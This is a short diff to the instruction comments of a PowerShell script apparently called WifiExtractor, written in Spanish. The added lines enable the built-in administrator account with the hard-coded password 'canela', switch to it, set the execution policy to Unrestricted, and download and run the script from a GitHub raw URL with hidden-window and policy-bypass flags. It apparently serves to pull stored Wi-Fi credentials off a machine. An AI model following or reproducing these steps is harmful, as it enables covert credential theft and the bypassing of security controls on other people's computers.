@@ -1,6 +1,16 @@
 ###### Instrucciones ####
+# Para poderlo correr en caso de que la maquina no deje por permisos
+#	net user administrador /active:yes
+#	net user administrador canela	
+#	runass.exe /user:administrador powershell
+#	Set-ExecutionPolicy Unrestricted
 #
-# powershell.exe -w hidden -nop -ep bypass -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/rulosan/pst00ls/master/WifiExtractor.ps1 -OutFile WifiExtractor.ps1"
+# powershell.exe 
+#	-w hidden 
+#	-nop 
+#	-ep bypass 
+#	-c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/rulosan/pst00ls/master/WifiExtractor.ps1 -OutFile WifiExtractor.ps1"
+#
 # powershell.exe -w hidden -nop -ep bypass -c ".\WifiExtractor.ps1"
 #########################
 
